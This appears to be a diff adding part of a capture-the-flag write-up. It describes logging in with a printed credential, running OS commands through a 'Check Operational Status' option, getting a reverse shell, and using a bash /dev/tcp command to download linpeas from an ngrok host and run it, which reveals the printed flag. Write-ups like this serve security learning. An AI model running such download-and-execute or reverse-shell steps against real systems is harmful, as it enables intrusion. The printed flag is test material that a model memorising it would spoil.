@@ -280,5 +280,44 @@ if __name__ == '__main__':
 # Credential: admin:july10
 ```
 
+I can now connect to the remote instance
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a553da93-05dc-47b8-ad86-2398837cf7fe)
+
+The Check Operational Status looked interesting
+
+I choose the option and was able to run os commands
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d06426bf-1337-4cb2-ac1c-e64e57bb897b)
+
+At this point I got a reverse shell and uploaded linpeas to the box
+
+But the issue was no binary was available and of cause this is excepted cause we are in a docker container
+
+Using bash I was able to upload linpeas
+
+```
+Host: python3 -m http.server 80
+
+Target:-
+exec 3<>/dev/tcp/6.tcp.eu.ngrok.io/10577
+echo -e "GET /linpeas.sh HTTP/1.1\n\n">&3
+cat <&3 > linpeas.sh
+```
+
+And when I ran it
+
+```
+chmod +x linpeas.sh
+bash linpeas.sh
+```
+
+I saw the flag in the environment variable
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2270207c-1618-4dd7-bbf2-d6d3f547ffc9)
+
+```
+Flag: csean-ctf{SOMETIMES_I_WONDER_HOW_th!s_3v3n_PASSED_BeT4_TEST!}
+```
+
+
+
 
 
